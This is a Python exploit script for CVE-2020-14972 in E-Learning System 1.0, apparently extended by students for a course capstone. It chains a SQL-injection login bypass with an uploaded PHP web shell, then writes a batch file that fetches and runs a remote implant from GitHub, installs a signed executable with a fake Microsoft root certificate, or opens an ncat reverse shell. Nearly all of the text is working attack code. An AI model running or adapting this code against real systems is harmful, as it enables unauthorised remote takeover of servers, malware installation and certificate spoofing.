# Original Exploit Author: Himanshu Shukla & Saurav Shukla
# CS590J Extensions Yefim Shneyderman, Anthony Rinaldi & Brendon Ky
# Exploit Code: https://www.exploit-db.com/exploits/49434
# CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14972
# Vendor Homepage: https://www.sourcecodester.com/php/12808/e-learning-system-using-phpmysqli.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/caiwl.zip

import requests
import colorama
from colorama import Fore, Back, Style
import socket
import argparse

# get the target ip address from command line input
parser = argparse.ArgumentParser()
parser.add_argument('rhost', required=False)

args = parser.parse_args()

RHOST = args.rhost
if RHOST is None:
    RHOST = 'localhost'

colorama.init(autoreset=True)

print('########################################################')
print('##                 E-LEARNING SYSTEM 1.0              ##')
print('##   AUTHENTICATION BYPASS & REMOTE CODE EXECUTION    ##')
print('##   Yefim Shneyderman, Anthony Rinaldi, Brendon Ky   ##')
print('##                                                    ##')
print('##                        .-.                         ##')
print("##                       (0.0)                        ##")
print("##                     '=.|m|.='                      ##")
print("##                     .='^^^'=.                      ##")
print('##                                                    ##')
print('########################################################')

#Create a new session
s = requests.Session() 
  
#Set Cookie
cookies = {'PHPSESSID': 'd794ba06fcba883d6e9aaf6e528b0733'}

#LINK=input("Enter URL of The Vulnarable Application : ")
LINK = f"http://{RHOST}/caiwl/"

#Authentication Bypass
print("Attempting Authentication Bypass...")
values = {"user_email":"'or 1 or'", "user_pass":"lol","btnLogin":""}
r=s.post(LINK+'admin/login.php', data=values, cookies=cookies) 

r=s.post(LINK+'admin/login.php', data=values, cookies=cookies) 

#Check if Authentication was bypassed or not.
logged_in = True if("You login as Administrator." in r.text) else False
l=logged_in
if l:
	print(f"{Fore.GREEN}Authentication Bypass Successful!")
else:
	print(f"{Fore.RED}Failed To Authenticate!")
	print("Check that the victim program is running (XAMP Apache and MySQL)")
	exit()

#Creating a PHP Web Shell

phpshell  = {
					'file': 
						(
						 'shell.php', 
						 '<?php echo shell_exec($_REQUEST["cmd"]); ?>', 
						 'application/x-php', 
						{'Content-Disposition': 'form-data'}
						) 
				 }

# Defining value for form data
data = {'LessonChapter':'test', 'LessonTitle':'test','Category':'Docs','save':''}



#Uploading Reverse Shell
print("Uploading PHP Shell For RCE...")
upload = s.post(LINK+'/admin/modules/lesson/controller.php?action=add', cookies=cookies, files=phpshell, data=data, verify=False)

shell_upload = True if("window.location='index.php'" in upload.text) else False
u=shell_upload
if u:
	print(f"{Fore.GREEN}PHP Shell has been uploaded successfully!")
else:
	print(f"{Fore.RED}Failed To Upload The PHP Shell!")

#Host IP Address (attacker)
LHOST = socket.gethostbyname(socket.gethostname())
#Host port (attacker)
LPORT = "9999"

print('If you want a reverse shell, start your Netcat Listener in another terminal with this command : ncat -l '+LPORT)
print('Otherwise open another terminal and run c2.py')
print(f"{Fore.CYAN}Enter 'i' to install and run implant. Enter 'c' to install implant as an exe with fake certificate. Any other button to just get a reverse shell:")
choice = input(">>")
#Creating the Script
print("Creating the batch script file to setup the reverse shell")
if(choice == 'i' or choice == 'I'):
	print("Selected .py implant install")
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo curl https://raw.githubusercontent.com/yshneyderman/CS590J-Capstone/main/caiwl.py -O caiwl.py > script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo python caiwl.py {LHOST}>> script.bat', cookies=cookies) 
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies) 
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo EXIT>> script.bat', cookies=cookies) 

elif(choice == 'c' or choice == 'C'):
	print("Selected signed .exe implant install")
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo curl https://raw.githubusercontent.com/yshneyderman/CS590J-Capstone/main/caiwl_signed.exe -O caiwl_signed.exe > script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo curl https://raw.githubusercontent.com/yshneyderman/CS590J-Capstone/main/MicrosoftECCProductRootCertificateAuthority.cer -O MicrosoftECCProductRootCertificateAuthority.cer > script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo ./caiwl_signed.exe>> script.bat', cookies=cookies) 
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies) 
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo EXIT>> script.bat', cookies=cookies) 

else:
	print("Selected reverse shell")
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo cd C:\\Program Files (x86)\\Nmap > script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies)
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo ncat.exe {RHOST} 9999 -e cmd.exe>> script.bat', cookies=cookies) 
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies) 
	e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=echo EXIT>> script.bat', cookies=cookies) 


#Executing The Webshell (Beachhead)
print("Launching the reverse shell/beachhead")
e=s.get(f'http://{RHOST}/caiwl/admin/modules/lesson/files/shell.php?cmd=script.bat', cookies=cookies)
print("Response: ", e)
exit()
				